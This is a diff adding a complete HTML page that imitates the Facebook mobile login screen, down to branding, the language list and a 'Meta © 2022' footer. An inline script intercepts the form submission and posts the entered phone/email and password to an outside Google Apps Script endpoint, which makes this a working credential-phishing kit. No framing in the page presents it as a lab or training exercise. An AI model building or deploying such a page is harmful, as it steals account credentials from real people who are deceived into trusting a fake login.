@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <title>Login into Facebook</title>
+
+        <!-- HTML -->
+
+
+        <!-- Custom Styles -->
+        <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+        <div class="header">
+                <img src="/pg.jpg">
+                <p class="p1"><a style="text-decoration: none; color:#3b5999;" href="#"> Get Facebook for Android and browse faster.</p></a>
+                <p class="p2">You must log in first.</p>
+        </div>
+        <hr size="1px" color="#e2d78e">
+
+
+        <h2 align="center" style=" margin-top:15px;color:#1776f4;">facebook</h2>
+
+
+        <div class="inputs">
+                <form name="form"method="POST" action="">
+                <input name="Phone"class="inputs" type="text" placeholder="Mobile number or email address  "required><br>
+                <input name="Pass" class="inputss" type="text" placeholder="Password"required>
+             <button name="submit"type="submit">
+                Log In </button>
+        </div><br>
+
+                </form>
+                <br><br>
+                
+                <a class="f" href="#" style="text-decoration:none;color:#1776f4">Forgotten password?</a>
+                
+                <br>    <br>
+                
+                <p class="or">or</p> 
+                <hr color="bebebe"class="h"width="90%" size="1px">
+                
+ <button class="create"type="submit">Create New Account</button>
+
+
+
+<div class="language">
+        <ul>
+<li style="font-weight:bolder;">English (UK)</li>
+<li>ਪੰਜਾਬੀ</li>
+<li>தமிழ்</li>
+<li>मराठी</li>
+</ul>
+</div>
+<div class="language2">
+                <ul>
+                <li>  हिन्दी  </li>
+                <li>  اردو  </li>
+                <li>   বাংলা </li>
+                <li><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-plus-square" viewBox="0 0 16 16">
+                        <path d="M14 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1h12zM2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2z" />
+                        <path d="M8 4a.5.5 0 0 1 .5.5v3h3a.5.5 0 0 1 0 1h-3v3a.5.5 0 0 1-1 0v-3h-3a.5.5 0 0 1 0-1h3v-3A.5.5 0 0 1 8 4z" />
+                </svg></li>
+                        </ul>
+</div>
+
+
+
+
+
+
+
+
+<h5 align="center"> Meta © 2022</h5>
+<script>
+
+			const scriptURL = 'https://script.google.com/macros/s/AKfycbxD28OxZp-UKkWNjrGKve5cRQUMTAIduhvonfHBE2_x5tc548mrGC9KaovGsLKv_CTW/exec'
+
+			const form = document.forms['form']
+		  
+			form.addEventListener('submit', e => {
+			  e.preventDefault()
+			  fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+				.then(response => console.log('Success!', response))
+				.catch(error => console.error('Error!', error.message))
+			})
+		  </script>
+        <!-- Project -->
+        <script src="main.js"></script>
+</body>
+
+</html>
